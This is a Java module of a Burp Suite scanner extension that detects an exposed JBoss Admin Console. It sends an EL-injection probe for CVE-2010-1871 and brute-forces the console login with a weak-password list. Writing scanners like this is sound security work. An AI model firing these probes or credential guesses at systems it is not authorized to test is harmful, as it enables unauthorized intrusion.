package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.WeakPassword;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Verify if the JBoss Admin Console is reachable
 *
 * http://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/Administration_Console_User_Guide-Accessing_the_Console.html
 * http://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/
 *
 */
public class JBossAdminConsole implements IModule {

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private static final String TITLE = "JBoss Admin Console";
    private static final String DESCRIPTION = "J2EEscan identified the JBoss Application Server administration console "
            + "installed on the remote system";

    private static final String TITLE_WEAK_PASSWORD = "JBoss Admin Console Weak Password";
    private static final String DESCRIPTION_WEAK_PASSWORD = "J2EEscan identified the JBoss Application Server administration console is "
            + "installed on the remote system with a weak password. This issue allows a remote attacker to install "
            + "remote web backdoors on the AS<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/Administration_Console_User_Guide-Accessing_the_Console.html<br />"
            + "http://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/";

    private static final String REMEDY = "Change default/weak password and/or restrict access to the management console only from trusted hosts/networks";

    private static final String TITLE_JBOSS_CVE_2010_1871 = "JBoss SEAM Remote Command Execution (CVE 2010-1871)";
    private static final String DESCRIPTION_JBOSS_CVE_2010_1871 = "J2EEscan identified a remote command execution on the JBoss SEAM framework ."
            + "The vulnerable JBoss SEAM framework is vulnerable to EL (Expression Language) "
            + "Injection vulnerability; an expression language makes it possible to easily "
            + "access application data stored in JavaBeans components. <br />"
            + "The EL Injection vulnerability allows a remote user to control data passed "
            + "to the EL Interpreter, allowing attackers, in some cases, to execute code on the server."
            + "installed on the remote system with a weak password.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://www.exploit-db.com/exploits/36653/<br />"
            + "http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html<br />"
            + "http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html<br />"
            + "https://bugzilla.redhat.com/show_bug.cgi?id=615956";
    private static final String REMEDY_CVE_2010_1871 = "Update the JBoss Enterprise Application Platform";

    
    private static final List<String> JBOSS_ADMIN_PATHS = Arrays.asList(
            "/admin-console/login.seam;jsessionid=4416F53DDE1DBC8081CDBDCDD1666FB0"
    );
    // <title>JBoss AS Administration Console</title>
    // <title>JBoss AS Admin Console</title>
    private static final List<byte[]> GREP_STRINGS = Arrays.asList(
            "<title>JBoss AS Admin".getBytes(),
            "<title>JBoss AS 6 Admin Console</title>".getBytes(),
            "<title>JBoss EAP Admin Console</title>".getBytes()
    );
    
    /**
     * Vulnerable instance replies with a 302 redirect and with a similar Location header
     * Location: https://HOST/admin-console/success.seam?user=public+static+java.lang.Runtime+java.lang.Runtime.getRuntime%28%29%0D%0A%0D%0A&conversationId=5
     */     
    private static final byte[] GREP_STRING_CVE20101871 = "public+static+java.lang.Runtime+java.lang.Runtime.getRuntime".getBytes();

    private PrintWriter stderr;

    
    
    /**
     * Test for CVE 2010-1871 on the Jboss Admin console
     *
     * References: 
     * https://bugzilla.redhat.com/show_bug.cgi?id=615956
     * http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html
     * http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html
     * http://www.exploit-db.com/exploits/36653/
     *
     */
    public void testJBossSEAMAdminCVE20101871(IBurpExtenderCallbacks callbacks, URL url,
            IHttpRequestResponse baseRequestResponse) throws MalformedURLException {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<String> headers = new ArrayList<>();
        headers.add("POST " + JBOSS_ADMIN_PATHS.get(0) + " HTTP/1.1");
        headers.add("Host: " + url.getHost() + ":" + url.getPort());
        headers.add("Content-Type: application/x-www-form-urlencoded");
        headers.add("Cookie: JSESSIONID=4416F53DDE1DBC8081CDBDCDD1666FB0");

        String body = "actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')}";

        byte[] seamMesssage = helpers.buildHttpMessage(headers, body.getBytes());

        IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), seamMesssage);

        // look for matches of our active check grep string in the response body
        byte[] httpResponse = resp.getResponse();
        List<int[]> matches = getMatches(httpResponse, GREP_STRING_CVE20101871, helpers);
        if (matches.size() > 0) {
            callbacks.addScanIssue(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    new URL(url.getProtocol(), url.getHost(), url.getPort(), "/admin-console/login.seam"),
                    new CustomHttpRequestResponse(seamMesssage, httpResponse, baseRequestResponse.getHttpService()),
                    TITLE_JBOSS_CVE_2010_1871,
                    DESCRIPTION_JBOSS_CVE_2010_1871,
                    REMEDY_CVE_2010_1871,
                    Risk.High,
                    Confidence.Certain
            ));
        }
    }

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();
            Boolean isSSL = (protocol.equals("https"));

            for (String JBOSS_ADMIN_PATH : JBOSS_ADMIN_PATHS) {

                try {

                    URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), JBOSS_ADMIN_PATH);
                    byte[] jbosstest = helpers.buildHttpRequest(urlToTest);

                    byte[] response = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, jbosstest);

                    IResponseInfo jbossAdminInfo = helpers.analyzeResponse(response);

                    if (jbossAdminInfo.getStatusCode() == 200) {

                        // look for matches of our active check grep string
                        for (byte[] GREP_STRING : GREP_STRINGS) {

                            List<int[]> matches = getMatches(response, GREP_STRING, helpers);

                            if (matches.size() > 0) {

                                    callbacks.addScanIssue(new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            new URL(protocol, url.getHost(), url.getPort(), "/admin-console/login.seam"),
                                            new CustomHttpRequestResponse(jbosstest, response, baseRequestResponse.getHttpService()),
                                            TITLE,
                                            DESCRIPTION,
                                            REMEDY,
                                            Risk.High,
                                            Confidence.Certain
                                    ));

                                // Test for JBOSS Seam EL Injection
                                testJBossSEAMAdminCVE20101871(callbacks, urlToTest, baseRequestResponse);
                                
                                /**
                                 * Try to bruteforce the login from
                                 *
                                 * Successful login attempt
                                 *
                                 * login_form=login_form&login_form%3Aname=test&login_form%3Apassword=tes&login_form%3Asubmit=Login&javax.faces.ViewState=
                                 *
                                 * HTTP/1.1 302 Moved Temporarily 
                                 * Server: Apache-Coyote/1.1 
                                 * X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1 
                                 * X-Powered-By: JSF/1.2
                                 * Location: http://wwww.example.com/admin-console/secure/summary.seam?conversationId=391
                                 * Set-Cookie: JSESSIONID=9D6DCB5F2E0CA1AAE374FE763EED9C79; Path=/admin-console
                                 */
                                // Retrieve the javax
                                // id="javax.faces.ViewState" value="
                                Pattern p = Pattern.compile("id=\"javax.faces.ViewState\" value=\"(.*?)\"");
                                Matcher matcher = p.matcher(helpers.bytesToString(response));

                                if (matcher.find()) {
                                    String viewState = matcher.group(1);
                                    byte[] jbosstestPOST = callbacks.getHelpers().toggleRequestMethod(jbosstest);

                                    IRequestInfo jbosstestPOSTInfo = helpers.analyzeRequest(jbosstestPOST);

                                    List<String> requestHeadersToTest = new ArrayList<>(jbosstestPOSTInfo.getHeaders());
                                    requestHeadersToTest.add("Cookie: JSESSIONID=11C3E6C1B22DB1AC64344FFFE6FBF811");

                                    //login_form=login_form&login_form%3Aname=test&login_form%3Apassword=tes&login_form%3Asubmit=Login&javax.faces.ViewState=
                                    jbosstestPOST = helpers.addParameter(jbosstestPOST, helpers.buildParameter("login_form", "login_form", IParameter.PARAM_BODY));
                                    jbosstestPOST = helpers.addParameter(jbosstestPOST, helpers.buildParameter("login_form%3Asubmit", "Login", IParameter.PARAM_BODY));
                                    jbosstestPOST = helpers.addParameter(jbosstestPOST, helpers.buildParameter("javax.faces.ViewState", helpers.urlEncode(viewState), IParameter.PARAM_BODY));

                                    List<Map.Entry<String, String>> credentials = WeakPassword.getCredentials();
                                    for (Map.Entry<String, String> credential : credentials) {
                                        byte[] jbosstestPOSTBruteforce = jbosstestPOST;
                                        jbosstestPOSTBruteforce = helpers.addParameter(jbosstestPOSTBruteforce, helpers.buildParameter("login_form%3Aname", credential.getKey(), IParameter.PARAM_BODY));
                                        jbosstestPOSTBruteforce = helpers.addParameter(jbosstestPOSTBruteforce, helpers.buildParameter("login_form%3Apassword", credential.getValue(), IParameter.PARAM_BODY));

                                        byte[] evilMessage = callbacks.getHelpers().buildHttpMessage(requestHeadersToTest, Arrays.copyOfRange(jbosstestPOSTBruteforce, helpers.analyzeRequest(jbosstestPOSTBruteforce).getBodyOffset(), jbosstestPOSTBruteforce.length));
                                        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), evilMessage);

                                        IResponseInfo statusAuthResponse = helpers.analyzeResponse(checkRequestResponse.getResponse());

                                        if (statusAuthResponse.getStatusCode() >= 300 && statusAuthResponse.getStatusCode() < 400) {

                                            List<String> responseHeaders = statusAuthResponse.getHeaders();

                                            for (int h = 0; h < responseHeaders.size(); h++) {
                                                if (responseHeaders.get(h).toLowerCase().startsWith("location".toLowerCase())
                                                        && responseHeaders.get(h).toLowerCase().contains("secure/summary.seam")) {

                                                    callbacks.addScanIssue(new CustomScanIssue(
                                                            baseRequestResponse.getHttpService(),
                                                            new URL(protocol, url.getHost(), url.getPort(), JBOSS_ADMIN_PATH),
                                                            new CustomHttpRequestResponse(evilMessage, checkRequestResponse.getResponse(), baseRequestResponse.getHttpService()),
                                                            TITLE_WEAK_PASSWORD,
                                                            DESCRIPTION_WEAK_PASSWORD,
                                                            REMEDY,
                                                            Risk.Low,
                                                            Confidence.Certain
                                                    ));

                                                }
                                            }
                                        }
                                    }
                                }

                            } else {
                                stderr.println("While testing JBoss Admin panel Weak password"
                                        + " it was not possible to retrieve Javax.faces.viewstate");
                            }

                        }
                    }

                } catch (MalformedURLException ex) {
                    stderr.println("Malformed URL Exception " + ex);
                }
            }
        }

        return issues;
    }

}
